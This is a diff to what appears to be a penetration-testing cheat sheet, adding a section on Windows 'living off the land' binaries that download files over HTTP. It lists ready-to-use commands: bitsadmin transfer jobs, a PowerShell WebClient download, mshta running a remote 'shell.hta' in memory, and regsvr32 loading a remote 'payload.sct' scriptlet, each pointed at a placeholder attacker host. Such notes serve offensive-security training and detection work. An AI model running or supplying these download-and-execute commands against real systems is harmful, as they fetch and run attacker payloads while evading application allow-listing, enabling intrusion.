@@ -230,6 +230,34 @@ PS C:\windows\system32\wbem> systeminfo
 
 ```
 
+## http lolbins
+2. bitsadmin.exe
 
+Creates background transfer jobs:
 
+```sql
+bitsadmin /create myJob
+bitsadmin /addfile myJob http://IP/file.exe C:\path\file.exe
+bitsadmin /resume myJob
+bitsadmin /complete myJob
+```
+
+3. powershell.exe
+
+Uses WebClient or Invoke-WebRequest:
+```powershell
+(New-Object Net.WebClient).DownloadFile('http://IP/file.exe', 'C:\path\file.exe')
+```
+4. mshta.exe
+
+Executes HTA scripts from URL (downloads and runs in memory):
+```sql
+mshta http://IP/shell.hta
+```
+5. regsvr32.exe
+
+Runs scriptlet files remotely:
+```sql
+regsvr32 /s /n /u /i:http://IP/payload.sct scrobj.dll
+```
 
